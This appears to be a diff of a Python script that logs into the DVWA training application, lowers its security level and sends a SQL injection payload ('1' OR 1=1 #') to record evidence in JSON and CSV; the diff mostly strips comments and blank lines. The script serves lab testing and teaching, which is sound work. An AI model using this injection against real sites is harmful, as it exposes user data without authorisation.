@@ -3,7 +3,6 @@ import json
 import csv
 from datetime import datetime, timezone
 from pathlib import Path
-
 import requests
 
 
@@ -19,8 +18,6 @@ def login_to_dvwa(session):
     """
 
     login_url = f"{BASE_URL}/login.php"
-
-    # First load the login page
     response = session.get(login_url)
 
     if response.status_code != 200:
@@ -41,7 +38,6 @@ def login_to_dvwa(session):
     if token_match:
         login_data["user_token"] = token_match.group(1)
 
-    # Send login request
     response = session.post(
         login_url,
         data=login_data,
@@ -62,19 +58,12 @@ def collect_sql_injection_evidence():
     """
 
     session = requests.Session()
-
-    # Login first
     login_to_dvwa(session)
-
-    # Force DVWA security level to Low
     session.cookies.set("security", "low")
-
     target_url = f"{BASE_URL}/vulnerabilities/sqli/"
 
-    # -------------------------
+ 
     # 1. Normal request
-    # -------------------------
-
     normal_params = {
         "id": "1",
         "Submit": "Submit"
@@ -87,10 +76,8 @@ def collect_sql_injection_evidence():
 
     print("\nNormal request completed.")
 
-    # -------------------------
+    
     # 2. SQL Injection request
-    # -------------------------
-
     injection_payload = "1' OR 1=1 #"
 
     injection_params = {
@@ -105,10 +92,8 @@ def collect_sql_injection_evidence():
 
     print("Injection request completed.")
 
-    # -------------------------
-    # 3. Compare responses
-    # -------------------------
 
+    # 3. Compare responses
     normal_users = normal_response.text.count("First name:")
     injected_users = injection_response.text.count("First name:")
 
@@ -150,19 +135,14 @@ def save_evidence(evidence):
     evidence["target"] = BASE_URL
     evidence["finding_type"] = "sql_injection"
 
-    # -------------------------
+   
     # Save JSON
-    # -------------------------
-
     json_file = artifacts_dir / f"{run_id}_runtime_evidence.json"
 
     with json_file.open("w", encoding="utf-8") as f:
         json.dump(evidence, f, indent=2)
 
-    # -------------------------
     # Save CSV for Excel
-    # -------------------------
-
     csv_file = artifacts_dir / "runtime_evidence_results.csv"
 
     file_exists = csv_file.exists()
